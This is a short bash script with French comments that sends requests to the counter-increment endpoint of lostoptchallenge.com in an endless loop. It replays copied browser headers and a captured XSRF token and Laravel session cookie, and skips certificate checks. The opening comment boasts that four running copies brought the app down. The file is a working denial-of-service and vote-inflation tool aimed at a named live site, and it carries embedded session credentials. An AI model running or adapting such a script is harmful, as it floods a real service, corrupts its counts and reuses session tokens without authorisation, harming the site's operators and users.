#!/bin/bash

# App down with 4 instances 🤡
# Définition de la fonction pour exécuter la requête curl
execute_curl() {
    curl -i -s -k -X $'GET' \
    -H $'Host: lostoptchallenge.com' -H $'Sec-Ch-Ua: \"Google Chrome\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"' -H $'Accept: */*' -H $'X-Requested-With: XMLHttpRequest' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36' -H $'Sec-Ch-Ua-Platform: \"macOS\"' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: https://lostoptchallenge.com/' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7' \
    -b $'XSRF-TOKEN=eyJpdiI6InUwaE42K2xxcmJwVWVjMTJNTG9tdVE9PSIsInZhbHVlIjoiK2NRNUswM2hYdEZBRDU1cVBtaytuVENzRW91d3NZekZEVklGZzF0VkQyMGpCQzFUOTJKaWxvL0RKeTFDSWZCSVk3VlhnWHJrTHB5Z2hyMnFTT3RRZkZ4OFN1c1JCeGY3SEpob3VjVGd6WGN1SjV2YXVkY3pGNzJHR2lPb3lvQnUiLCJtYWMiOiI3ZGY3ZWViYmIyNmU4MzBiNDhkN2ZlOTljNjllYTlkN2Y4OTc4YjIxZTAzOTc2Zjk4Yjg5NmYzNjk2ZGFiZDlhIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlBtcHZubEFXeTdPV1FCQWtKS3E2MHc9PSIsInZhbHVlIjoidmIvdTNqWjh5UXpXekVKUUxlaXB2eE5lZVNYdWNMMDFzNUwyQitiSyt3YnU3bWQyTG8vNmFOQUpDTDk5Um9RU1g0VkxzRExMZ2FKaThjcjc2c0ovUzlWU3IvZE1qTGhXeUdMcHN6N0dNdkNHV000U25IWHhFZkJtRnVwbzMvKzAiLCJtYWMiOiJmNjgzZmNkZjI4NjMxMGE4M2JhN2IxNTE4MGQ3NjA5YTc1MGZjZGI0MWNlZDc2N2Q1YjU5YTAwNDk3OWE2YzQ3IiwidGFnIjoiIn0%3D' \
    $'https://lostoptchallenge.com/api/counter/add'
}

# Boucle infinie pour exécuter la requête curl en continu
while true; do
    execute_curl
done

